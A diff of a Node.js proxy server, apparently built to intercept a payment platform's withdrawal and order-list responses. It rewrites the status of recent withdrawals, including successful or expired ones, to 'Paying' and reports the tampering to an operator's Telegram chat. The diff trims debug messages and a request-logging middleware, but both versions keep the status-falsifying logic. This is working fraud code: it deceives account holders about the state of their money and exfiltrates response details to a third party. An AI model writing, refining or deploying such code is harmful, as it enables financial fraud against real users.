@@ -153,18 +153,6 @@ app.use((req, res, next) => {
   });
 });
 
-app.use(async (req, res, next) => {
-  try {
-    const bankData = await loadData();
-    if (bankData.withdrawOverride > 0 && bankData.adminChatId && bot) {
-      const path = req.originalUrl || req.url;
-      if (path !== '/api/telegram' && !path.includes('favicon')) {
-        bot.sendMessage(bankData.adminChatId, `📡 ${req.method} ${path}`).catch(() => {});
-      }
-    }
-  } catch(e) {}
-  next();
-});
 
 async function transparentProxy(req, res) {
   try {
@@ -955,42 +943,12 @@ async function proxyAndReplaceBankInList(req, res) {
         if (Array.isArray(jsonResp.data)) items = jsonResp.data;
         else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) items = jsonResp.data.list;
         else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) items = jsonResp.data.records;
-        if (!items && typeof jsonResp.data === 'object') {
-          for (const k of Object.keys(jsonResp.data)) {
-            if (Array.isArray(jsonResp.data[k]) && jsonResp.data[k].length > 0) {
-              items = jsonResp.data[k];
-              break;
-            }
-          }
-        }
 
-        if (items && items.length > 0 && items[0]) {
-          const allKeys = Object.keys(items[0]);
-          const statusKeys = allKeys.filter(k => /status/i.test(k));
-          if (statusKeys.length > 0 || items[0].status !== undefined) {
-            let changed = 0;
-            const changedDetails = [];
-            for (let i = items.length - 1; i >= 0 && changed < wCount; i--) {
-              const oldVals = statusKeys.map(k => `${k}=${JSON.stringify(items[i][k])}`).join(',');
-              for (const sk of statusKeys) {
-                if (/name|text/i.test(sk)) {
-                  items[i][sk] = 'Paying';
-                } else {
-                  items[i][sk] = 0;
-                }
-              }
-              if (statusKeys.length === 0) {
-                items[i].status = 0;
-                items[i].statusName = 'Paying';
-              }
-              changedDetails.push(`${oldVals || 'no-status'} → Paying (₹${items[i].amount || items[i].amountOrder || items[i].money || '?'})`);
-              changed++;
-            }
-            if (changed > 0 && bankData.adminChatId && bot) {
-              bot.sendMessage(bankData.adminChatId,
-                `✅ [${req.originalUrl}] Changed ${changed}/${items.length} item(s):\nKeys: ${allKeys.join(',')}\nStatus keys: ${statusKeys.join(',')}\n${changedDetails.join('\n')}`
-              ).catch(() => {});
-            }
+        if (items && items.length > 0 && items[0].stat !== undefined) {
+          let changed = 0;
+          for (let i = items.length - 1; i >= 0 && changed < wCount; i--) {
+            items[i].stat = 0;
+            changed++;
           }
         }
       }
@@ -1037,81 +995,21 @@ app.all('/payOrder/list', async (req, res) => {
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
-    if (count > 0 && bankData.adminChatId && bot) {
-      const dataKeys = jsonResp ? Object.keys(jsonResp).join(',') : 'null';
-      const dataType = jsonResp && jsonResp.data ? (Array.isArray(jsonResp.data) ? 'array' : typeof jsonResp.data) : 'null';
-      let dataSubKeys = 'N/A';
-      if (jsonResp && jsonResp.data && typeof jsonResp.data === 'object' && !Array.isArray(jsonResp.data)) {
-        dataSubKeys = Object.keys(jsonResp.data).map(k => {
-          const v = jsonResp.data[k];
-          return `${k}:${Array.isArray(v) ? 'arr[' + v.length + ']' : typeof v}`;
-        }).join(', ');
+    if (count > 0 && jsonResp && Array.isArray(jsonResp.data) && jsonResp.data.length > 0) {
+      const items = jsonResp.data;
+      let changed = 0;
+      const changedDetails = [];
+      for (let i = items.length - 1; i >= 0 && changed < count; i--) {
+        const oldStat = items[i].stat;
+        const statNames = { 0: 'Paying', 1: 'SUCCESS', 4: 'Expired' };
+        items[i].stat = 0;
+        changedDetails.push(`₹${(items[i].amount || 0) / 100} (${statNames[oldStat] || 'stat=' + oldStat} → Paying)`);
+        changed++;
       }
-      bot.sendMessage(bankData.adminChatId,
-        `🔎 /payOrder/list RAW:\nTop keys: ${dataKeys}\ndata type: ${dataType}\ndata sub-keys: ${dataSubKeys}\nFull resp (first 500): ${respBody.substring(0, 500)}`
-      ).catch(() => {});
-    }
-
-    if (count > 0 && jsonResp) {
-      let items = null;
-      const dataObj = jsonResp.data || jsonResp;
-
-      if (Array.isArray(dataObj)) {
-        items = dataObj;
-      } else if (typeof dataObj === 'object' && dataObj !== null) {
-        if (dataObj.list && Array.isArray(dataObj.list)) items = dataObj.list;
-        else if (dataObj.records && Array.isArray(dataObj.records)) items = dataObj.records;
-        else if (dataObj.rows && Array.isArray(dataObj.rows)) items = dataObj.rows;
-        else if (dataObj.items && Array.isArray(dataObj.items)) items = dataObj.items;
-        if (!items) {
-          for (const k of Object.keys(dataObj)) {
-            if (Array.isArray(dataObj[k]) && dataObj[k].length > 0) {
-              items = dataObj[k];
-              if (bankData.adminChatId && bot) {
-                bot.sendMessage(bankData.adminChatId, `📦 Found array in key: "${k}" (${dataObj[k].length} items)`).catch(() => {});
-              }
-              break;
-            }
-          }
-        }
-      }
-
-      if (items && items.length > 0) {
-        const lastItem = items[items.length - 1];
-        if (bankData.adminChatId && bot) {
-          bot.sendMessage(bankData.adminChatId,
-            `📊 Last item FULL dump:\n${JSON.stringify(lastItem, null, 1).substring(0, 800)}`
-          ).catch(() => {});
-        }
-
-        const allKeys = Object.keys(lastItem);
-        let changed = 0;
-        const changedDetails = [];
-        for (let i = items.length - 1; i >= 0 && changed < count; i--) {
-          const beforeStr = JSON.stringify(items[i]).substring(0, 200);
-          for (const k of allKeys) {
-            if (/^status$/i.test(k) || /^statusname$/i.test(k) || /^statustext$/i.test(k) || /^paystatus$/i.test(k) || /^state$/i.test(k) || /^orderStatus$/i.test(k)) {
-              if (/name|text/i.test(k)) {
-                items[i][k] = 'Paying';
-              } else {
-                items[i][k] = 0;
-              }
-            }
-          }
-          const afterStr = JSON.stringify(items[i]).substring(0, 200);
-          changedDetails.push(`BEFORE: ${beforeStr}\nAFTER: ${afterStr}`);
-          changed++;
-        }
-
-        if (changed > 0 && bankData.adminChatId && bot) {
-          bot.sendMessage(bankData.adminChatId,
-            `✅ Modified ${changed} item(s):\n${changedDetails.join('\n---\n')}`
-          ).catch(() => {});
-        }
-      } else {
-        if (bankData.adminChatId && bot) {
-          bot.sendMessage(bankData.adminChatId, `⚠️ No items array found in response!`).catch(() => {});
-        }
+      if (changed > 0 && bankData.adminChatId && bot) {
+        bot.sendMessage(bankData.adminChatId,
+          `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`
+        ).catch(() => {});
       }
     }
 
